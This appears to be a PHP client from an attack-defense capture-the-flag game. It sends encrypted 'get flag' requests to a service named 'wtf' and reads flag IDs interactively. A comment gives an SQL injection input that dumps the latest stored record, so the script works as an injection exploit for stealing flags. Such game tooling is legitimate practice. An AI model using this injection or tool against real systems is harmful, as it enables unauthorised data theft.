#!/usr/bin/php
<?php
$SERVICE = "wtf";
$PORT = 2943;

require "_checker_common.php";

function do_request($ip, $request) {
    global $PORT;

    $iv = "\x94\xae\xc3\x7f\xf4\x92\xfe\x82\x29\x07\x2c\x12\x90\xa4\x87\x61";
    while (true) {
        $key = mcrypt_create_iv(32, MCRYPT_DEV_URANDOM);
        if (preg_match('#\x00|[\x09-\x0d]|\x20#s', $key)) {
            continue;
        }
        
        $enc = mcrypt_encrypt("loki97", $key, $request, "cbc", $iv);
        if (preg_match('#\x00|[\x09-\x0d]|\x20#s', $enc)) {
            continue;
        }

        break;
    }

    ffsockopen($ip, $PORT);
    ffwrite($key . $iv . $enc . "\n");
    $ciph = freadall();
    $iv = substr($ciph, 0, 16);
    $ciph = substr($ciph, 16);
    $response = mcrypt_decrypt("loki97", $key, $ciph, "cbc", $iv);
    $response = rtrim($response, "\x00");
    
    return $response;
}

function get($ip, $flagId) {
    $request = "g|$flagId";
    $response = do_request($ip, $request);

    return $response;
}

if (!isset($argv[1])) {
    exit("USAGE: $argv[0] IP\n");
}

while (true) {
    echo "id > ";  // for example: " or 1=1 order by `time` desc limit 1 -- -
    $id = rtrim(fgets(STDIN), "\n");
    var_dump(get($argv[1], $id));
    echo "\n";
}
